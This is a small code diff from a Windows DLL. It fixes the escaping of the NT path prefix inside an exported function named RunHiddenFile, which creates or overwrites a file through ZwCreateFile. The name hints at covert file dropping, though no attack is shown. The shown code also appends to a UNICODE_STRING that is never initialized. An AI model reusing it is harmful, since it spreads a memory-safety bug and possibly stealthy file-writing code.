@@ -70,7 +70,7 @@ extern "C" __declspec(dllexport) NTSTATUS RunHiddenFile()
     UNICODE_STRING tempFileName;
     WCHAR tempFileNameBuffer[MAX_PATH];
     RtlSecureZeroMemory(tempFileNameBuffer, sizeof(tempFileNameBuffer));
-    RtlAppendUnicodeToString(&tempFileName, L"\??\");
+    RtlAppendUnicodeToString(&tempFileName, L"\??\\");
     RtlAppendUnicodeStringToString(&tempFileName, &fileName);
     InitializeObjectAttributes(&objectAttributes, &tempFileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
     NTSTATUS status = ZwCreateFile(&fileHandle, GENERIC_WRITE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE, NULL, 0);
